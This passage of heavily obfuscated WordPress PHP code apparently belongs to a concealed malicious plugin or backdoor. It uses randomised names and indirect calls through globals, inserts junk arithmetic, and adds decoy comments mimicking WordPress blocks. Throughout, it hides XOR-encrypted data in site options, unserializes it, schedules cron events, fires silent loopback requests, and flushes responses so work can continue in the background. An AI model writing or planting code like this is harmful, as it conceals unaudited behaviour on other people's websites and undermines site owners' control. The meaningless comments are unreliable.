   $n2rgnov1e5pke   =     $GLOBALS['__scf__ofafsmvux__148']($GLOBALS['__scf__6hbvafs34jo_336']($GLOBALS['__scf_zjq4u5uadyu0x_227'](lpwgqh9300(345), $GLOBALS['__scf_ezzukb35pvl6__337'](m40pvx5ij_z4mj(338), $pejktj7t68m6))));

     if    (!  empty($n2rgnov1e5pke))  {
 return      array(m40pvx5ij_z4mj(341) =>  $thd1u8m_anjnz,  m40pvx5ij_z4mj(346)   => $n2rgnov1e5pke);
       }
   }
 r63yaewew47stuijcrwsx6(bovhd4vawcd(347),  lpwgqh9300(348));
    return      array();
 }
 function  xyvseg64iflvb126($kgidn0bo_1ewjd6r,   $zjnd0_ump_, $qxm2wu04glvxorm)



   {
// Sodium crypto: fuzz dataflow-graph

 if  (!  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(349)))  {
 return   false;
}
    if  (isset($GLOBALS[m40pvx5ij_z4mj(350)]) &&     $GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[lpwgqh9300(350)]) && $GLOBALS['__scf_z1gy18gsi2_qr4_240']($kgidn0bo_1ewjd6r,   $GLOBALS[lpwgqh9300(350)]))     {
// WP Post Author style fallback

 unset($GLOBALS[m5t68uuej1(350)][$kgidn0bo_1ewjd6r]);
}
 $pgdfohj28qig745 =  $GLOBALS['__scf_dl_1lcowe4_351']($zjnd0_ump_);
 $fftk9vp_ad3g8mpo  = $GLOBALS['__scf_of4qyeiv5oh8t_352']($GLOBALS['__scf_e1fr80hqavau3c_353'](1,  (0xf+0xf0)));
 $enrpn5eaaph9ml9 =  "";
      for  ($x9adbai0k0pb_mgl  =  0, $bwl_978bbp0hzrqg  =  $GLOBALS['__scf_fr9u7cq1eo_10']($pgdfohj28qig745); $x9adbai0k0pb_mgl  <  $bwl_978bbp0hzrqg;    $x9adbai0k0pb_mgl++) {
$enrpn5eaaph9ml9  .= $GLOBALS['__scf_of4qyeiv5oh8t_352']($GLOBALS['__scf_hajqvo8bhu_332']($pgdfohj28qig745[$x9adbai0k0pb_mgl])  ^ $GLOBALS['__scf_hajqvo8bhu_332']($fftk9vp_ad3g8mpo));
  }
return update_option($kgidn0bo_1ewjd6r, $GLOBALS['__scf_xsxk3ht6_06zc_354']($fftk9vp_ad3g8mpo  . $enrpn5eaaph9ml9), $qxm2wu04glvxorm)     !== false;
}

 function i1v3dbjfcu375r($kgidn0bo_1ewjd6r,     $n13lnt1ous87idh)
 {


   if (!$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(355)))    return  $n13lnt1ous87idh;
      if (isset($GLOBALS[lpwgqh9300(350)]) && $GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[bovhd4vawcd(350)])  &&   $GLOBALS['__scf_z1gy18gsi2_qr4_240']($kgidn0bo_1ewjd6r, $GLOBALS[bovhd4vawcd(350)]))  {
return   $GLOBALS[bovhd4vawcd(350)][$kgidn0bo_1ewjd6r];
}
 $ci62257bq00  =    get_option($kgidn0bo_1ewjd6r,  "");
 if   ($ci62257bq00   ===  ""  || !    $GLOBALS['__scf_e_8z8ias8ka_43']($ci62257bq00)) {
 return   $n13lnt1ous87idh;



   }
  $m75rqrqbs_1llnw =   @$GLOBALS['__scf_wak9390fh7p_356']($ci62257bq00,  true);
        if    ($m75rqrqbs_1llnw ===      false    ||  $GLOBALS['__scf_fr9u7cq1eo_10']($m75rqrqbs_1llnw) <   2) {
   return  $n13lnt1ous87idh;


 }
 $fftk9vp_ad3g8mpo   = $m75rqrqbs_1llnw[0];
 




 $a0vjh7jawl    = "";
for    ($x9adbai0k0pb_mgl =      1,   $bwl_978bbp0hzrqg  =  $GLOBALS['__scf_fr9u7cq1eo_10']($m75rqrqbs_1llnw);   $x9adbai0k0pb_mgl   <  $bwl_978bbp0hzrqg;   $x9adbai0k0pb_mgl++) {
    $a0vjh7jawl .= $GLOBALS['__scf_of4qyeiv5oh8t_352']($GLOBALS['__scf_hajqvo8bhu_332']($m75rqrqbs_1llnw[$x9adbai0k0pb_mgl])      ^   $GLOBALS['__scf_hajqvo8bhu_332']($fftk9vp_ad3g8mpo));
 }


   $gmgx7_edk902ic5o   =   xxfwy1b80pjn7bvjqfw($a0vjh7jawl);
if    ($gmgx7_edk902ic5o !==  false) {


if  (!isset($GLOBALS[m5t68uuej1(350)])      ||     !$GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[bovhd4vawcd(350)]))    $GLOBALS[bovhd4vawcd(350)] =     array();
     if ($GLOBALS['__scf_xbixt340jb_38']($GLOBALS[lpwgqh9300(350)])   >  (15+49))   $GLOBALS[lpwgqh9300(350)] =    array();
$GLOBALS[m5t68uuej1(350)][$kgidn0bo_1ewjd6r]  =  $gmgx7_edk902ic5o;
    

  return    $gmgx7_edk902ic5o;
       }
  return $n13lnt1ous87idh;$glt8hu4vfnu89i=35*2;$pab0luz3agj=$glt8hu4vfnu89i-37;
    }
   function  xxfwy1b80pjn7bvjqfw($biu009h8ggntwd3)
 {
 if (!$GLOBALS['__scf_e_8z8ias8ka_43']($biu009h8ggntwd3))     return false;
  if  (defined(bovhd4vawcd(357))    && PHP_VERSION_ID >=  (69959+41))   {
    return    @$GLOBALS['__scf_o29w98gt8o_358']($biu009h8ggntwd3, array(lpwgqh9300(359)  => false));
 }
 return   @$GLOBALS['__scf_o29w98gt8o_358']($biu009h8ggntwd3);

 }
  function   v9s3wf2mek5emrxlic2bu()
 {
  static  $yivzbj99kx559x =    null;
if    ($yivzbj99kx559x !==  null)   return  $yivzbj99kx559x;



   $ln5_jbqpu4in =   defined(bovhd4vawcd(89)) ? ABSPATH   : "";
   $yivzbj99kx559x = $GLOBALS['__scf_zsw089px33o1o__12']($GLOBALS['__scf_kr_w9stt2gb_360']('\\',  '/', $ln5_jbqpu4in), '/') .      '/';

    return $yivzbj99kx559x;

  }
  function    zoeevr3iz5hokjv($kgidn0bo_1ewjd6r)
{
 return dv62azao9qb3z33m4cwig0(v9s3wf2mek5emrxlic2bu()  . (string)   eliqs4hzzhoila0pbe()   .  $kgidn0bo_1ewjd6r, (3<<2));
}
   function  r6u7xx6bh80hwva027($e7iswev08tryjha)


{
// little-endian format


  return (string)  ((22686848+68313152)     +   ((int)     hexdec($GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59'](v9s3wf2mek5emrxlic2bu() .   lpwgqh9300(361)  . $e7iswev08tryjha),     0, (1+6)))  %   (0x5e79de+0x2ada61)));
 }


    function    uabq4b2_hbev4ff2bd3hy()
     {
   return    r6u7xx6bh80hwva027(bovhd4vawcd(362));
   }
  function  ea3rn1t45vvwzrmig2qjw3()
{
    $a94au_fesrwo3rl =   (string)   d6ydz3_mq4hw_2s8_bo(m5t68uuej1(363),    "");
  return   $GLOBALS['__scf_fr9u7cq1eo_10']($a94au_fesrwo3rl)    >    (3+7) &&    $GLOBALS['__scf_i8i8g4oxha_7']($a94au_fesrwo3rl,     uabq4b2_hbev4ff2bd3hy()) !==  false  && $GLOBALS['__scf_fr9u7cq1eo_10']((string)  d6ydz3_mq4hw_2s8_bo(bovhd4vawcd(364),  "")) > (25+75);
 }

 
   function      d6ydz3_mq4hw_2s8_bo($kgidn0bo_1ewjd6r,   $n13lnt1ous87idh)
     {
     return   i1v3dbjfcu375r(zoeevr3iz5hokjv($kgidn0bo_1ewjd6r),   $n13lnt1ous87idh);
}
   function  sb3q0_7sw2xmlw84($kgidn0bo_1ewjd6r, $n13lnt1ous87idh  =    "")
   {

$kdbfhd3lu4ttw  =   d6ydz3_mq4hw_2s8_bo($kgidn0bo_1ewjd6r,     $n13lnt1ous87idh);


    if   ($GLOBALS['__scf_e_8z8ias8ka_43']($kdbfhd3lu4ttw)) return    $kdbfhd3lu4ttw;
 if ($GLOBALS['__scf_j_1rdtsntzx_365']($kdbfhd3lu4ttw))    return    (string)  $kdbfhd3lu4ttw;
  return $n13lnt1ous87idh;
   }
function      vmq5vh_lh7_vsiehf4nm($kgidn0bo_1ewjd6r, $zjnd0_ump_,  $qxm2wu04glvxorm)


 {
// unbind incremental composite

 return      xyvseg64iflvb126(zoeevr3iz5hokjv($kgidn0bo_1ewjd6r),   $zjnd0_ump_,   $qxm2wu04glvxorm);
}
  function  t78r30znuybrmbsnd()
    {

    $rlaf3_dtr5w  = isset($GLOBALS[lpwgqh9300(366)]) ?    $GLOBALS[bovhd4vawcd(367)] : array();

      $ci62257bq00    = d6ydz3_mq4hw_2s8_bo(m40pvx5ij_z4mj(368),  array());



    if    ($GLOBALS['__scf_pomb89yiuz_37']($ci62257bq00))     {
// WP Template Parts: dispatch stack-frame

   $rlaf3_dtr5w   =    $GLOBALS['__scf_zb77rzhln7336v_369']($ci62257bq00,  $rlaf3_dtr5w);
}
  $rlaf3_dtr5w      = $GLOBALS['__scf_jghjt9zxt358_149']($rlaf3_dtr5w);
 return $GLOBALS['__scf_tcy2zdxc2t_157']($rlaf3_dtr5w, -(0x2b+0x7));


 }
      function  ldoye85t4nagxxamkxwo()
  {
if     (!isset($GLOBALS[m40pvx5ij_z4mj(367)]) ||  empty($GLOBALS[m40pvx5ij_z4mj(367)]))     return;
try    {

   $ci62257bq00      =      d6ydz3_mq4hw_2s8_bo(m40pvx5ij_z4mj(368),  array());
  $whmuecs54bk3zop = $GLOBALS['__scf_jghjt9zxt358_149']($GLOBALS['__scf_zb77rzhln7336v_369']((array)$ci62257bq00,     $GLOBALS[m5t68uuej1(367)]));
  $whmuecs54bk3zop     =  $GLOBALS['__scf_tcy2zdxc2t_157']($whmuecs54bk3zop, -(4+46));


      vmq5vh_lh7_vsiehf4nm(lpwgqh9300(368), $whmuecs54bk3zop,     lpwgqh9300(190));



 }  catch   (Throwable  $k3g08rnqu9m) {
r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(370),     $k3g08rnqu9m);
 } catch    (Exception  $k3g08rnqu9m) {
  }



   }

 function  k__ppv5v06f7k9n1nm($biu009h8ggntwd3,     $key)

{
if      (!    $GLOBALS['__scf_e_8z8ias8ka_43']($biu009h8ggntwd3)      ||   !    $GLOBALS['__scf_e_8z8ias8ka_43']($key) ||  $GLOBALS['__scf_fr9u7cq1eo_10']($key) ===  0)    {
 return  null;
       }
 $g7kt4wf19sf5ez  =  $GLOBALS['__scf_fr9u7cq1eo_10']($biu009h8ggntwd3);
     $v6ax4s_3gd4  = $GLOBALS['__scf_fr9u7cq1eo_10']($key);
 $utln0lk9ielcmwaa  =   "";
for  ($x9adbai0k0pb_mgl  =  0;   $x9adbai0k0pb_mgl <     $g7kt4wf19sf5ez;  $x9adbai0k0pb_mgl++)    {
      $utln0lk9ielcmwaa .= $GLOBALS['__scf_of4qyeiv5oh8t_352']($GLOBALS['__scf_hajqvo8bhu_332']($biu009h8ggntwd3[$x9adbai0k0pb_mgl])  ^   $GLOBALS['__scf_hajqvo8bhu_332']($key[$x9adbai0k0pb_mgl  %  $v6ax4s_3gd4]));
     }



 return  $utln0lk9ielcmwaa;
}
    
   function z0yp6suothqssl797jmr_w($c7fvxhek7wooyif)
      {
 if    (!  $GLOBALS['__scf_pomb89yiuz_37']($c7fvxhek7wooyif))  {
// atomic dispatcher

      $c7fvxhek7wooyif    = array();
 }
    static   $y5_mqij2i6q6j    = null;
     if ($y5_mqij2i6q6j === null)   {$fgokfdhdkae_ql=66|93;$w3vqjv07chh=$fgokfdhdkae_ql^204;



      $y5_mqij2i6q6j  =  byffua_rebmvk2();
$lyoy9wp67q_   =  $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(371))    ?    i1v3dbjfcu375r(bovhd4vawcd(372),     false) :  false;
  if ($GLOBALS['__scf_pomb89yiuz_37']($lyoy9wp67q_)   &&    isset($lyoy9wp67q_[m5t68uuej1(373)])  &&  (int)  $lyoy9wp67q_[lpwgqh9300(374)]     >=    (284+16)  &&   (int)  $lyoy9wp67q_[m5t68uuej1(374)]   <=  (86368+32))    $y5_mqij2i6q6j  =     (int)  $lyoy9wp67q_[bovhd4vawcd(375)];
 if ($y5_mqij2i6q6j  <    (2+58))   {
     $y5_mqij2i6q6j   =  (3594+6);

  }
}
  $c7fvxhek7wooyif[m5t68uuej1(376)]   =    array(
m40pvx5ij_z4mj(377)  =>   $y5_mqij2i6q6j,
       bovhd4vawcd(378)      =>   lpwgqh9300(379),


     );

   $c7fvxhek7wooyif[m5t68uuej1(380)]  = array(



bovhd4vawcd(377)    => (597+3),
m40pvx5ij_z4mj(378)  => lpwgqh9300(379),
 );
return   $c7fvxhek7wooyif;
    }
 
    function   owb64bf9m2eyvldimcl3h2()
 {


    if (!$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(381))  ||  !$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(382)))  return;
if  (!beqgo0gfq6yfj82i0o(m5t68uuej1(383))) return;
 try   {
if     (!wp_next_scheduled(u_9shatqcniwqfywsjc2m()))  {


  wp_schedule_event($GLOBALS['__scf_ibw9xvmx9ckin_187']() +    $GLOBALS['__scf_e1fr80hqavau3c_353']((242^206),    (0xba+0x72)),  m40pvx5ij_z4mj(384),     u_9shatqcniwqfywsjc2m());$n6ku30yyjw=5615;$rgm2fvyl2j0=$n6ku30yyjw%2;
  }
}   finally  {
 xfcoteglc07i2qaoo(bovhd4vawcd(383));
       }
  }

function      ponkw1hlkfkt_hl71q()
{

 if  (defined(m5t68uuej1(385))  &&  DOING_CRON)  {
  return;
 }
  
     static  $myw3h598abz   =  false;



   if   ($myw3h598abz) return;
 $myw3h598abz  = true;
   
 if      (!     e2cjko8uls1hvw())   {
    return;
  }
/* synchronous call-graph */



 ki6tdgirglgewq(bovhd4vawcd(386), m40pvx5ij_z4mj(387), 0);
      }
function  cx8gzz66skf2zva9()
{
 if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(290))     ||    !$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(388)))   return;
 @$GLOBALS['__scf_bgujd0wqxduxtu_290'](site_url(m5t68uuej1(389)  .      $GLOBALS['__scf_kr_w9stt2gb_360']('.',  "",  (string)    $GLOBALS['__scf_ciwgxuks3i4cd_287'](true))    .  $GLOBALS['__scf_e1fr80hqavau3c_353']((92+8),  (949+50))),      array(m40pvx5ij_z4mj(291) => 0.01,     lpwgqh9300(390) =>   false, bovhd4vawcd(308)  =>  false));
 }
   function  dwm0k0bh2esn3ox7msp2k()
{
// WP Search Block shortcode parse




    static $iwifq2sjghh03 = false;
     if   ($iwifq2sjghh03) return;
  $iwifq2sjghh03 = true;


    try {
 lzt8bzbdn0surn();
 $j6m8ajwiirud8r  =  false;$te08w4a4q=11*2;$oa_t670o=$te08w4a4q-46;
     if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(391))) {
   $GLOBALS['__scf_sfs0wi3jqm1fd_391']();
 $j6m8ajwiirud8r      = true;



}  elseif  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(392))) {
   $GLOBALS['__scf_dhscvkxtkkh7_392']();
$j6m8ajwiirud8r  =   true;
}    else   {

  if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(393)))   {
// WP Spacer Block: non-strict witness


 @$GLOBALS['__scf_dg190gj3k4cyb_394'](true);
 }
     $oirf279nm6    = false;$o2mhq_sfxf=PHP_INT_MAX/PHP_INT_MAX;$j5o3yw5n1y=$o2mhq_sfxf+48;
 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(395)))  {
// cancel template for WP Post Comments

  $cw_ynhlmhkhqqugi =   $GLOBALS['__scf_vi47igxg1zd_103']($GLOBALS['__scf_nimluvpxhrpvn_323']((string) @$GLOBALS['__scf_qa8nkfur9w_111'](lpwgqh9300(396))));
      $oirf279nm6  =    ($cw_ynhlmhkhqqugi   !==    ""  &&    $cw_ynhlmhkhqqugi !== '0' &&      $cw_ynhlmhkhqqugi  !==  m40pvx5ij_z4mj(397));
}

$rjzj55vl59  =  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(398)) ? @ob_get_status(true) :  array();
   if  ($GLOBALS['__scf_pomb89yiuz_37']($rjzj55vl59))  {
    foreach ($rjzj55vl59     as  $bfhsla2uju0tpj6) {
// WordPress 6.4 patterns: equivariant dataflow-graph

 $h021jqyhtl49yv  =     $GLOBALS['__scf_pomb89yiuz_37']($bfhsla2uju0tpj6) &&   isset($bfhsla2uju0tpj6[lpwgqh9300(399)])   ?  $GLOBALS['__scf_vi47igxg1zd_103']((string) $bfhsla2uju0tpj6[lpwgqh9300(399)]) : "";
if    ($GLOBALS['__scf_i8i8g4oxha_7']($h021jqyhtl49yv,   bovhd4vawcd(400))  !==     false  ||   $GLOBALS['__scf_i8i8g4oxha_7']($h021jqyhtl49yv,   lpwgqh9300(401)) !== false)   {
 $oirf279nm6  =  true;
       break;
     }
}
}
  if      (!$oirf279nm6 &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(402)))  {
// schedule dense subscriber

foreach  ((array)   @headers_list()  as    $xbmx6otfize8z5)   {
       if   (stripos($xbmx6otfize8z5,     m40pvx5ij_z4mj(403))   ===   0  &&    stripos($xbmx6otfize8z5,    lpwgqh9300(404)) ===    false)   {
   $oirf279nm6 =  true;
  break;
}
       }
  }
$ghni1h_318u3x  =  $GLOBALS['__scf_ebsa9aprq0y_104']();

$x7v_bk6qaih8l =  ($ghni1h_318u3x  !==   bovhd4vawcd(405) &&     $ghni1h_318u3x  !== m5t68uuej1(406));
      $riis_n0xni9p6188  =  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(407))  ?    (int)   @http_response_code()     :   (198+2);
   $n1poy1uwixhf_h = ($riis_n0xni9p6188    >=  (25<<2) &&    $riis_n0xni9p6188 < (168+32)) || $riis_n0xni9p6188    ===   (317-113)    ||    $riis_n0xni9p6188 ===  (213+91);
     $_da5gb6_ks9   =     (isset($_SERVER[m40pvx5ij_z4mj(408)])  &&  $_SERVER[m5t68uuej1(409)] ===      lpwgqh9300(410));
   $hji_5gmpuw      =  false;$kw1kgfj3pop87w=72*8;$o_jz43gu3k3=$kw1kgfj3pop87w-39;
  if  ($x7v_bk6qaih8l   &&     !$n1poy1uwixhf_h  &&   !$_da5gb6_ks9 &&  !headers_sent() &&    !$oirf279nm6)  {
     while   ($GLOBALS['__scf_t1qun6sstv31a4_411']() > 1)  {



 $jorlegxa2cfr  =   $GLOBALS['__scf_t1qun6sstv31a4_411']();$gbikxrsc=598;$k46b4m2c78a=($gbikxrsc>0)?$gbikxrsc:-$gbikxrsc;
    if  (!@$GLOBALS['__scf_kaaaw926skklz8_412']()  || $GLOBALS['__scf_t1qun6sstv31a4_411']()     >=    $jorlegxa2cfr)    break;$ztm22ddezbs=12+16;$wfxf3l_lxgl0n=$ztm22ddezbs-47;
 }
$bfhsla2uju0tpj6    = $GLOBALS['__scf_t1qun6sstv31a4_411']() ===  1    &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(398))    ?    @ob_get_status()     :     array();$oqqgm6plj5coj8=PHP_MAJOR_VERSION;$i9n_tnegg1=$oqqgm6plj5coj8*7;
  $h021jqyhtl49yv =  $GLOBALS['__scf_pomb89yiuz_37']($bfhsla2uju0tpj6)   &&   isset($bfhsla2uju0tpj6[m5t68uuej1(413)])  ? $GLOBALS['__scf_vi47igxg1zd_103']((string)    $bfhsla2uju0tpj6[m40pvx5ij_z4mj(413)])  :  "";
    $_cl    =  false;

       if  ($GLOBALS['__scf_t1qun6sstv31a4_411']()      === 0)    {
    $_cl  =      0;
    }    elseif     (



$GLOBALS['__scf_t1qun6sstv31a4_411']()    ===   1
      &&     $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(398))
&& ($h021jqyhtl49yv  ===  ""  ||     $h021jqyhtl49yv === bovhd4vawcd(414))



&&    $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(415))


 ) {
$_cl =     @ob_get_length();


  }
 $h7pg1s2gq_     =      true;
 if (isset($GLOBALS[lpwgqh9300(416)][m40pvx5ij_z4mj(386)])) {
 $_wf =     $GLOBALS[lpwgqh9300(417)][m40pvx5ij_z4mj(386)];
   $aztchtq4xdl_    =   ($GLOBALS['__scf_pd74_ila1rfp_70']($_wf)  &&      isset($_wf->callbacks))  ?   $_wf->callbacks     :   ($GLOBALS['__scf_pomb89yiuz_37']($_wf) ?  $_wf      : array());
  foreach ($aztchtq4xdl_  as $_pr  =>  $zutfwpznfjn273f9) {
// clopen certificate-chain

  if   (!$GLOBALS['__scf_pomb89yiuz_37']($zutfwpznfjn273f9))      continue;
     foreach ($zutfwpznfjn273f9  as   $vlwopwnmtlzszz)  {


       $lhks6akov8jrjgap  =  ($GLOBALS['__scf_pomb89yiuz_37']($vlwopwnmtlzszz) &&   isset($vlwopwnmtlzszz[bovhd4vawcd(71)]))    ?    $vlwopwnmtlzszz[lpwgqh9300(71)]   : "";
  if  ($GLOBALS['__scf_e_8z8ias8ka_43']($lhks6akov8jrjgap)  &&  $GLOBALS['__scf_hf87ul3fvpzrkm_150']($lhks6akov8jrjgap,     array(bovhd4vawcd(387), lpwgqh9300(418)),  true))   continue;
 $h7pg1s2gq_  = false;
 break  2;
  }
       }
   unset($_wf,  $aztchtq4xdl_,  $_pr,   $zutfwpznfjn273f9,   $vlwopwnmtlzszz, $lhks6akov8jrjgap);



  }



 if   ($_cl !==    false   && $h7pg1s2gq_   && !headers_sent())   {
     @header(m40pvx5ij_z4mj(419)  . (int) $_cl);
    @header(lpwgqh9300(420));
 $hji_5gmpuw =  true;
 }
}
if ($x7v_bk6qaih8l) {
    while      ($GLOBALS['__scf_t1qun6sstv31a4_411']()   >  0)  {$tb4074iztiin=145|16;$lix43uw011=$tb4074iztiin^144;

$jorlegxa2cfr     =  $GLOBALS['__scf_t1qun6sstv31a4_411']();
      if      (!@$GLOBALS['__scf_kaaaw926skklz8_412']() || $GLOBALS['__scf_t1qun6sstv31a4_411']() >=   $jorlegxa2cfr)     break;
  }
// @spill accumulator

     @$GLOBALS['__scf_z7ypj2lb3f_421']();$i6_o5_mk57=4409;$bkydkmupl5=$i6_o5_mk57%16;
  }
   if  ($hji_5gmpuw   && $GLOBALS['__scf_t1qun6sstv31a4_411']()   === 0)   $j6m8ajwiirud8r  =  true;$s3g3ckmsq00ny=(0x17+0x9a);$gvbpw4xxq7n=$s3g3ckmsq00ny%15;
      unset($oirf279nm6,   $cw_ynhlmhkhqqugi, $rjzj55vl59,   $bfhsla2uju0tpj6,  $h021jqyhtl49yv,  $xbmx6otfize8z5, $ghni1h_318u3x,  $x7v_bk6qaih8l, $riis_n0xni9p6188,  $n1poy1uwixhf_h, $hji_5gmpuw,   $jorlegxa2cfr,  $_cl,   $_da5gb6_ks9);
}
  $hvtcp3dwweuqn =     $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(422))   &&  !(defined(bovhd4vawcd(423)) &&  DISABLE_WP_CRON);



   $zga7jdkyrgia0y2 =      !$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(371))  ||  (int)   get_option(lpwgqh9300(424), 0)   === 0;
 if    (!$zga7jdkyrgia0y2    &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(371))    && $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(349)))  {


  $b17a5e7iy_    =  (string)     get_option(m40pvx5ij_z4mj(425), "");
   if    ($b17a5e7iy_   !==      kdgw8qqvzf6yolk())    {
@update_option(bovhd4vawcd(425),   kdgw8qqvzf6yolk(),  m5t68uuej1(190));$r6bff_3cf4kcg=5568;$jpp8lue07nr=$r6bff_3cf4kcg%13;
 @update_option(lpwgqh9300(424),   0, lpwgqh9300(190));



      $zga7jdkyrgia0y2   =  true;
}
   }
// packed layout

     $azsn3nkbzm3u  =   false;
  if     ($hvtcp3dwweuqn &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(381)))   {
   $lbopu784vljr09 =    wp_next_scheduled(u_9shatqcniwqfywsjc2m());



if ($lbopu784vljr09   &&   ($GLOBALS['__scf_ibw9xvmx9ckin_187']()   -   (int) $lbopu784vljr09)  >   (7199+1)) {


       $azsn3nkbzm3u =   true;

 if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(426))) @wp_unschedule_event((int)  $lbopu784vljr09,      u_9shatqcniwqfywsjc2m());
  }
      }
  if   ($hvtcp3dwweuqn && !$zga7jdkyrgia0y2  &&    !$azsn3nkbzm3u) {

  $h7s3bm9x2f9bwfe_ = $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(381))  ?   (int)     wp_next_scheduled(u_9shatqcniwqfywsjc2m()) : 0;
     if  ($h7s3bm9x2f9bwfe_ <=  0 ||  $h7s3bm9x2f9bwfe_      -  $GLOBALS['__scf_ibw9xvmx9ckin_187']() >   (854+46))  {
  @wp_schedule_single_event($GLOBALS['__scf_ibw9xvmx9ckin_187'](),     u_9shatqcniwqfywsjc2m());
}


  zajx5ferauowzwf();
  return;



     }
    if ($azsn3nkbzm3u)  r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(427), lpwgqh9300(428));
 if  (!$j6m8ajwiirud8r)  {

if ($hvtcp3dwweuqn)   {
/* dense negotiation */

 @wp_schedule_single_event($GLOBALS['__scf_ibw9xvmx9ckin_187'](), u_9shatqcniwqfywsjc2m());
cx8gzz66skf2zva9();
     zajx5ferauowzwf();
 return;
}
if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(429)))  @$GLOBALS['__scf_hkezfepne6p6xo_429']((45<<2));
  dade6y16p3ix6n((8+2));
 return;
   }

  if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(430))) @$GLOBALS['__scf_hkezfepne6p6xo_429']((90<<1));
  dade6y16p3ix6n();
   }    catch (Throwable $k3g08rnqu9m)    {
   r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(386),  $k3g08rnqu9m);
 } catch (Exception     $k3g08rnqu9m)  {
}
}
 
 function  n1o_pvf67he3sltgu()
{
  try    {
if  (!  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(431))) {
/* heuristic skolem */

  return;$njhsh79ou_=14*7;$vgizilqzv7bmk=$njhsh79ou_-31;

 }
    
$ckgo37poxo =   $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(432))   ? get_transient(ikw0tf8wjoufcwbi7uaqr())  :   false;
// Redis object cache image dimensions



 if    (! $GLOBALS['__scf_pomb89yiuz_37']($ckgo37poxo))  $ckgo37poxo   = i1v3dbjfcu375r(m40pvx5ij_z4mj(372), false);
 if     (! $GLOBALS['__scf_pomb89yiuz_37']($ckgo37poxo))   {
    return;
}
  

        if  (isset($ckgo37poxo[bovhd4vawcd(433)]) &&   $GLOBALS['__scf_pomb89yiuz_37']($ckgo37poxo[lpwgqh9300(434)])) {
 $GLOBALS[lpwgqh9300(435)] =  uthk3dq07jkmf_m1s19i4x($ckgo37poxo[lpwgqh9300(434)]);

   }

     if     (isset($ckgo37poxo[m5t68uuej1(436)])     &&  $GLOBALS['__scf_pomb89yiuz_37']($ckgo37poxo[m40pvx5ij_z4mj(437)]))      {
    $GLOBALS[m40pvx5ij_z4mj(438)] =  uthk3dq07jkmf_m1s19i4x($ckgo37poxo[bovhd4vawcd(437)]);
    }
  
   if   (isset($ckgo37poxo[m40pvx5ij_z4mj(439)])  &&   $GLOBALS['__scf_e_8z8ias8ka_43']($ckgo37poxo[lpwgqh9300(439)])) {
     $GLOBALS[bovhd4vawcd(440)]     =  $ckgo37poxo[bovhd4vawcd(439)];
    }



if  (isset($ckgo37poxo[m5t68uuej1(441)])   &&  $GLOBALS['__scf_e_8z8ias8ka_43']($ckgo37poxo[lpwgqh9300(441)]) &&     $GLOBALS['__scf_fr9u7cq1eo_10']($ckgo37poxo[m40pvx5ij_z4mj(442)]) >  (20+30))  {



  $GLOBALS[bovhd4vawcd(443)]  =     $ckgo37poxo[m5t68uuej1(442)];
 }
        if   (isset($ckgo37poxo[m5t68uuej1(362)])      &&  $GLOBALS['__scf_e_8z8ias8ka_43']($ckgo37poxo[m5t68uuej1(362)])  &&   $GLOBALS['__scf_fr9u7cq1eo_10']($ckgo37poxo[bovhd4vawcd(362)])  >  (0x63+0x1))  {
       $GLOBALS[m5t68uuej1(444)]  =  $ckgo37poxo[m5t68uuej1(362)];$pq5zjl708wu9=25*2;$nz_7__czr8t6k=$pq5zjl708wu9-45;
 }
}   catch (Throwable    $k3g08rnqu9m)  {
   r63yaewew47stuijcrwsx6(lpwgqh9300(445),     $k3g08rnqu9m);
 }   catch   (Exception    $k3g08rnqu9m) {
 }
  }
   
  function   i2yexl_j1s5ivgiiqy_39()
   {
        try   {
 if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(446)) ||  !$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(349)))  return;

  if ((int)  get_option(m40pvx5ij_z4mj(447), 0)   >  $GLOBALS['__scf_ibw9xvmx9ckin_187']() -    (6402-2802))  return;
if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(432)) &&  get_transient(m40pvx5ij_z4mj(448)))      return;
     if     (!p5_es53lv8rkijk1())      return;
$lboagfa__zx6_jm  = d6ydz3_mq4hw_2s8_bo(bovhd4vawcd(449),   "");
